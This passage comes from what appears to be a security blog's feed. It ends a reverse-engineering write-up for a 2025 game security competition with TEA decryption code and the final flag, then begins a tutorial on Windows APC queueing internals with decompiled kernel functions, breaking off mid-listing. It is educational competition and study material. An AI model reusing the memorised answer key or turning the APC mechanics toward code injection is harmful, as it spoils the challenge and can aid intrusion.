加密看似是标版，实则解密之后会发现不对，这里可以先 <code>dump 140004060</code> 的数据，尝试进行 TEA 解密。其实很好判断解密是否成功，解密之后的数据异或 <code>sxx</code> 之后，应当得到一个 <code>@</code> 开头的全 ASCII 字符，标准解密失败之后有次不小心交叉引用 <code>TEAEnc</code> 函数的时候发现了问题所在。</p><img src="/2025/03/31/tencent-race-2025-pre/20.png" class=""><p>显然，该函数是被 hook 了，这里直接考虑动态调试去 <code>dump</code>。</p><h4 id="动态调试-1"><a href="#动态调试-1" class="headerlink" title="动态调试"></a>动态调试</h4><img src="/2025/03/31/tencent-race-2025-pre/21.png" class=""><p>找到地址直接去看看 hook 函数。</p><img src="/2025/03/31/tencent-race-2025-pre/22.png" class=""><p>好在该 hook 也不复杂，但是直接分析汇编指令显然也不明智，把 hook 跳板拆开，将有效的指令插入原 code 中，最后修正偏移即可，这里可以直接选择区域导出十六进制值放 <code>CyberChef</code> 去分析，修跳转偏移也是。</p><img src="/2025/03/31/tencent-race-2025-pre/23.png" class=""><p>修图中框选的指令偏移即可。最后直接用 IDA 反编译，得到最终结果。</p><img src="/2025/03/31/tencent-race-2025-pre/24.png" class=""><p>根据伪代码写逆向逻辑即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt_tea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = delta*<span class="number">32</span>, i;     <span class="comment">/* set up */</span></span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];    <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                                 </span><br><span class="line">    <span class="type">uint32_t</span> result = sum + k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]; </span><br><span class="line">    v1 -= result ^ (v0 + ((<span class="number">16</span> * v0) ^ (v0 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">    v0 -= (sum + v1) ^ (k0 + <span class="number">16</span> * v1) ^ (k1 + (v1 &gt;&gt; <span class="number">5</span>));</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;                                                           <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[<span class="number">200</span>] =</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> enc[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> k[]=&#123;</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line"><span class="built_in">decrypt_tea</span>((<span class="type">uint32_t</span>*)(&amp;ida_chars[i*<span class="number">8</span>]),k);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">enc[i]=(ida_chars[i*<span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> key[]=<span class="string">&quot;sxx&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">enc[i]^=key[i%<span class="number">3</span>];</span><br><span class="line"><span class="built_in">putchar</span>(enc[i]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//@PksUn39kYj763ggA1HLBUCaWSZv4vs4CwSevAnQEs</span></span><br></pre></td></tr></table></figure><p>手动去掉 <code>@</code>，然后逆转再 <code>base58</code> 解码，得到答案。</p><img src="/2025/03/31/tencent-race-2025-pre/25.png" class=""><p>所以最终正确输入就是 <code>ACE_We1C0me!T0Z0Z5GamESecur1t9*CTf</code>。</p>]]></content>
    
    
    <summary type="html">记录一下今年 2025 初赛过程</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="腾讯游戏安全竞赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>windowsAPC学习（2）——APC挂入与执行</title>
    <link href="https://xia0ji233.github.io/2025/02/17/WindowsAPC2/"/>
    <id>https://xia0ji233.github.io/2025/02/17/WindowsAPC2/</id>
    <published>2025-02-17T05:00:00.000Z</published>
    <updated>2025-02-17T05:50:31.446Z</updated>
    
    <content type="html"><![CDATA[<p>今天详细了解一下 APC 到底是怎么工作的。</p><span id="more"></span><h2 id="APC挂入"><a href="#APC挂入" class="headerlink" title="APC挂入"></a>APC挂入</h2><p>在 <code>APC</code> 挂入的时候，内核会准备一个 <code>_KAPC</code> 结构体，将该结构体挂入线程的 <code>APC</code> 队列中。</p><h3 id="KAPC结构体介绍"><a href="#KAPC结构体介绍" class="headerlink" title="KAPC结构体介绍"></a>KAPC结构体介绍</h3><p>先在 windbg 中查看一下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KAPC</span><br><span class="line">ntdll!_KAPC</span><br><span class="line">   <span class="number">+0x000</span> Type             : UChar</span><br><span class="line">   <span class="number">+0x001</span> SpareByte0       : UChar</span><br><span class="line">   <span class="number">+0x002</span> Size             : UChar</span><br><span class="line">   <span class="number">+0x003</span> SpareByte1       : UChar</span><br><span class="line">   <span class="number">+0x004</span> SpareLong0       : Uint4B</span><br><span class="line">   <span class="number">+0x008</span> Thread           : Ptr32 _KTHREAD</span><br><span class="line">   <span class="number">+0x00c</span> ApcListEntry     : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x014</span> KernelRoutine    : Ptr32     <span class="type">void</span> </span><br><span class="line">   <span class="number">+0x018</span> RundownRoutine   : Ptr32     <span class="type">void</span> </span><br><span class="line">   <span class="number">+0x01c</span> NormalRoutine    : Ptr32     <span class="type">void</span> </span><br><span class="line">   <span class="number">+0x020</span> NormalContext    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x024</span> SystemArgument1  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x028</span> SystemArgument2  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x02c</span> ApcStateIndex    : Char</span><br><span class="line">   <span class="number">+0x02d</span> ApcMode          : Char</span><br><span class="line">   <span class="number">+0x02e</span> Inserted         : UChar</span><br></pre></td></tr></table></figure><p>介绍一些比较重要的成员：</p><table><thead><tr><th align="center"><strong>名称</strong></th><th align="center"><strong>含义</strong></th></tr></thead><tbody><tr><td align="center">Type</td><td align="center">为KOBJECTS枚举类型的ApcObject</td></tr><tr><td align="center">Size</td><td align="center">等于 <code>KAPC</code> 结构的大小</td></tr><tr><td align="center">Thread</td><td align="center">指向此 <code>APC</code> 对象所在的线程ETHREAD</td></tr><tr><td align="center">ApcListEntry</td><td align="center"><code>APC</code> 对象被加入到线程 <code>APC</code> 链表中的节点对象</td></tr><tr><td align="center">KernelRoutine</td><td align="center">指向释放 <code>APC</code> 对象的函数指针</td></tr><tr><td align="center">RundownRoutine</td><td align="center">函数指针（可选参数），当一个线程终止时，如果它的 <code>APC</code> 链表中还有 <code>APC</code> 对象，若RundownRoutine非空，则调用它所指函数</td></tr><tr><td align="center">NormalRoutine</td><td align="center">如果是内核 <code>APC</code>，指向要指向的函数，如果是用户 <code>APC</code> 指向了所有用户 <code>APC</code> 都会运行的函数</td></tr><tr><td align="center">NormalContext</td><td align="center">如果是内核 <code>APC</code> 该参数为NULL，如果是用户 <code>APC</code> 该参数就是真正要执行的用户APC函数</td></tr><tr><td align="center">SystemArgument1</td><td align="center"><code>APC</code> 函数的参数</td></tr><tr><td align="center">SystemArgument2</td><td align="center"><code>APC</code> 函数的参数</td></tr><tr><td align="center">AppStateIndex</td><td align="center">说明了APC对象的环境状态，它是KAPC_ENVIRONMENT枚举类型的成员，一旦APC对象被插入到线程的APC链表中，则ApcStateIndex指示了它位于线程ETHREAD对象的哪个APC链表中</td></tr><tr><td align="center">ApcMode</td><td align="center">为0表示这是一个内核APC，为1说明这是用户APC</td></tr><tr><td align="center">Inserted</td><td align="center">指示该APC是否已被插入到线程的APC链表中</td></tr></tbody></table><h2 id="APC挂入与执行流程"><a href="#APC挂入与执行流程" class="headerlink" title="APC挂入与执行流程"></a>APC挂入与执行流程</h2><p><code>QueueUserAPC-&gt;R3-&gt;R0-&gt;NtQueueApcThread-&gt;KeInitializeApc-&gt;KeInsertQueueApc-&gt;KiInsertQueueApc</code></p><p>其中 <code>QueueUserAPC</code> 这个函数位于 <code>kernel32.dll</code>，它会调用内核模块的 <code>NtQueueApcThread</code> 进行实现，经历过重重调用，使用 <code>KeInitializeApc</code> 为 <code>APC</code> 结构体分配内存并进行初始化，调用 <code>KeInsertQueueApc</code> 进行插入到指定队列，而插入最终由 <code>KiInsertQueueApc</code> 实现。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="NtQueueApcThreadEx"><a href="#NtQueueApcThreadEx" class="headerlink" title="NtQueueApcThreadEx"></a>NtQueueApcThreadEx</h4><p><code>NtQueueApcThread</code> 就是调用了一个 <code>NtQueueApcThread</code>，所以直接看到这个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">NtQueueApcThreadEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    ATOM_INFORMATION_CLASS Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ATOM_INFORMATION_CLASS a2,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> (__stdcall *NormalRoutine)(<span class="type">void</span> *, <span class="type">void</span> *, <span class="type">void</span> *),</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *Context,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> a5,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> a6)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">    NTSTATUS v7; <span class="comment">// esi</span></span><br><span class="line">    <span class="type">char</span> *v8; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_KAPC</span> *Kapc; <span class="comment">// esi</span></span><br><span class="line">    <span class="built_in">void</span> (__stdcall *v10)(_KAPC *, <span class="built_in">void</span> (__stdcall **)(<span class="type">void</span> *, <span class="type">void</span> *, <span class="type">void</span> *), <span class="type">void</span> **, <span class="type">void</span> **, <span class="type">void</span> **); <span class="comment">// eax</span></span><br><span class="line">    <span class="built_in">void</span> (__stdcall *RundownRoutine)(_KAPC *); <span class="comment">// edi</span></span><br><span class="line">    MEMORY_CACHING_TYPE v12; <span class="comment">// [esp+4h] [ebp-Ch] BYREF</span></span><br><span class="line">    <span class="type">int</span> AccessMode; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">    _KTHREAD *Thread; <span class="comment">// [esp+Ch] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOBYTE</span>(AccessMode) = <span class="built_in">KeGetCurrentThread</span>()-&gt;PreviousMode;</span><br><span class="line">    result = <span class="built_in">ObReferenceObjectByHandle</span>((HANDLE)Handle, <span class="number">0x10u</span>, (POBJECT_TYPE)PsThreadType, AccessMode, (PVOID *)&amp;Thread, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (Thread-&gt;MiscFlags &amp; <span class="number">0x2000</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = <span class="number">-1073741816</span>;</span><br><span class="line">            LABEL_15:</span><br><span class="line">            <span class="built_in">ObfDereferenceObject</span>(Thread);</span><br><span class="line">            <span class="keyword">return</span> v7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( a2 )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = <span class="built_in">ObReferenceObjectByHandle</span>((HANDLE)a2, <span class="number">2u</span>, PspMemoryReserveObjectTypes, AccessMode, (PVOID *)&amp;v12, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            v8 = (<span class="type">char</span> *)v12;</span><br><span class="line">            <span class="keyword">if</span> ( _InterlockedCompareExchange((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v12, <span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">ObfDereferenceObject</span>(v8);</span><br><span class="line">                v7 = <span class="number">-1073741584</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            &#125;</span><br><span class="line">            Kapc = (<span class="keyword">struct</span> _KAPC *)(v8 + <span class="number">4</span>);</span><br><span class="line">            v10 = (<span class="built_in">void</span> (__stdcall *)(_KAPC *, <span class="built_in">void</span> (__stdcall **)(<span class="type">void</span> *, <span class="type">void</span> *, <span class="type">void</span> *), <span class="type">void</span> **, <span class="type">void</span> **, <span class="type">void</span> **))PspUserApcReserveKernelRoutine;</span><br><span class="line">            RundownRoutine = (<span class="built_in">void</span> (__stdcall *)(_KAPC *))PspUserApcReserveRundownRoutine;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Kapc = (<span class="keyword">struct</span> _KAPC *)<span class="built_in">ExAllocatePoolWithQuotaTag</span>((POOL_TYPE)<span class="number">8</span>, <span class="number">0x30u</span>, <span class="number">0x70617350u</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !Kapc )</span><br><span class="line">            &#123;</span><br><span class="line">                v7 = <span class="number">-1073741801</span>;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">            &#125;</span><br><span class="line">            v10 = (<span class="built_in">void</span> (__stdcall *)(_KAPC *, <span class="built_in">void</span> (__stdcall **)(<span class="type">void</span> *, <span class="type">void</span> *, <span class="type">void</span> *), <span class="type">void</span> **, <span class="type">void</span> **, <span class="type">void</span> **))IopDeallocateApc;</span><br><span class="line">            RundownRoutine = (<span class="built_in">void</span> (__stdcall *)(_KAPC *))ExFreePool;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">KeInitializeApc</span>(Kapc, Thread, <span class="number">0</span>, v10, RundownRoutine, NormalRoutine, <span class="number">1</span>, Context);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">KeInsertQueueApc</span>(Kapc, a5, a6, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">RundownRoutine</span>(Kapc);</span><br><span class="line">            v7 = <span class="number">-1073741823</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数执行流程如下：</p><ul><li>根据句柄获得线程内核对象</li><li><code>KeInitializeApc</code> 初始化 <code>KAPC</code> 结构</li><li><code>KeInsertQueueApc</code> 插入 <code>APC</code></li></ul><h4 id="KeInitializeApc"><a href="#KeInitializeApc" class="headerlink" title="KeInitializeApc"></a>KeInitializeApc</h4><p><code>KeInitializeApc</code> 定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PKAPC __stdcall <span class="title">KeInitializeApc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PKAPC Apc,</span></span></span><br><span class="line"><span class="params"><span class="function">    _KTHREAD *Thread,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> TargetEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> (__stdcall *KernelRoutine)(_KAPC *, <span class="type">void</span> (__stdcall **)(<span class="type">void</span> *, <span class="type">void</span> *, <span class="type">void</span> *), <span class="type">void</span> **, <span class="type">void</span> **, <span class="type">void</span> **),</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> (__stdcall *RundownRoutine)(_KAPC *),</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> (__stdcall *NormalRoutine)(<span class="type">void</span> *, <span class="type">void</span> *, <span class="type">void</span> *),</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span> Mode,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">void</span> *Context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKAPC result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> ApcStateIndex; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">    result = Apc;</span><br><span class="line">    ApcStateIndex = TargetEnvironment;</span><br><span class="line">    Apc-&gt;Type = <span class="number">18</span>;</span><br><span class="line">    Apc-&gt;Size = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> ( TargetEnvironment == <span class="number">2</span> )</span><br><span class="line">        ApcStateIndex = Thread-&gt;ApcStateIndex;</span><br><span class="line">    Apc-&gt;Thread = Thread;</span><br><span class="line">    Apc-&gt;KernelRoutine = KernelRoutine;</span><br><span class="line">    Apc-&gt;ApcStateIndex = ApcStateIndex;</span><br><span class="line">    Apc-&gt;RundownRoutine = RundownRoutine;</span><br><span class="line">    Apc-&gt;NormalRoutine = NormalRoutine;</span><br><span class="line">    <span class="keyword">if</span> ( NormalRoutine )</span><br><span class="line">    &#123;</span><br><span class="line">        Apc-&gt;ApcMode = Mode;</span><br><span class="line">        Apc-&gt;NormalContext = Context;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Apc-&gt;ApcMode = <span class="number">0</span>;</span><br><span class="line">        Apc-&gt;NormalContext = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Apc-&gt;Inserted = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化了 <code>KAPC</code> 这个结构，并且根据 <code>TargetEnvironment</code> 去修正 <code>ApcStateIndex</code>，线程同样也有这个字段，不过含义不一样。</p><table><thead><tr><th align="center">值</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">原始环境</td></tr><tr><td align="center">1</td><td align="center">挂靠环境</td></tr><tr><td align="center">2</td><td align="center">当前环境</td></tr><tr><td align="center">3</td><td align="center">插入APC时的当前环境</td></tr></tbody></table><p>0和1值很好理解，跟线程结构体中该对象一致，主要就是 2 和 3 值：</p><p>当值为2的时候，插入的是当前进程的队列。什么是当前队列，是我不管你环境是挂靠还是不挂靠，我就插入当前进程的<code>APC</code>队列里面，以初始化<code>APC</code>的时候为基准。</p><p>当值为3时，插入的是当前进程的<code>APC</code>队列，此时有修复<code>ApcStateIndex</code>的操作，以插入<code>APC</code>的时候为基准。</p><h4 id="KeInsertQueueApc"><a href="#KeInsertQueueApc" class="headerlink" title="KeInsertQueueApc"></a>KeInsertQueueApc</h4><p>回到 <code>NtQueueApcThread</code> 函数，来看看其中调用的 <code>KeInsertQueueApc</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __stdcall <span class="title">KeInsertQueueApc</span><span class="params">(_KAPC *Kapc, <span class="type">void</span> *argument1, <span class="type">void</span> *argument2, <span class="type">char</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _KTHREAD *Thread; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">volatile</span> __int32 *p_ApcQueueLock; <span class="comment">// ebx</span></span><br><span class="line">    <span class="type">char</span> v7; <span class="comment">// [esp+13h] [ebp-Dh]</span></span><br><span class="line">    <span class="type">int</span> v8; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">    FS_INFORMATION_CLASS NewIrql; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">    _KPRCB *Prcb; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    Thread = Kapc-&gt;Thread;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(NewIrql) = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line">    Prcb = <span class="built_in">KeGetPcr</span>()-&gt;Prcb;</span><br><span class="line">    p_ApcQueueLock = (<span class="keyword">volatile</span> __int32 *)&amp;Thread-&gt;ApcQueueLock;</span><br><span class="line">    <span class="keyword">while</span> ( _InterlockedExchange(p_ApcQueueLock, <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (++v8 &amp; HvlLongSpinCountMask) != <span class="number">0</span> || (HvlEnlightenments &amp; <span class="number">0x40</span>) == <span class="number">0</span> )</span><br><span class="line">                _mm_pause();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">HvlNotifyLongSpinWait</span>(v8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( *p_ApcQueueLock );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_DWORD *)&amp;Thread-&gt;<span class="number">0</span> &amp; <span class="number">0x20</span>) == <span class="number">0</span> || Kapc-&gt;Inserted == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Kapc-&gt;SystemArgument1 = argument1;</span><br><span class="line">        Kapc-&gt;Inserted = <span class="number">1</span>;</span><br><span class="line">        Kapc-&gt;SystemArgument2 = argument2;</span><br><span class="line">        <span class="built_in">KiInsertQueueApc</span>(Prcb, Kapc, NewIrql);</span><br><span class="line">        v7 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _InterlockedAnd(p_ApcQueueLock, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">KiExitDispatcher</span>(Prcb, <span class="number">0</span>, <span class="number">1</span>, a4, NewIrql);</span><br><span class="line">    <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用流程如下：</p><ul><li>将中断等级提升至 <code>DISPATCH_LEVEL</code>，这个中断等级下不会做线程切换。</li><li>构造好 <code>Kapc</code> 结构体，调用 <code>KiInsertQueueApc</code> 函数。</li></ul><h4 id="KiInsertQueueApc"><a href="#KiInsertQueueApc" class="headerlink" title="KiInsertQueueApc"></a>KiInsertQueueApc</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 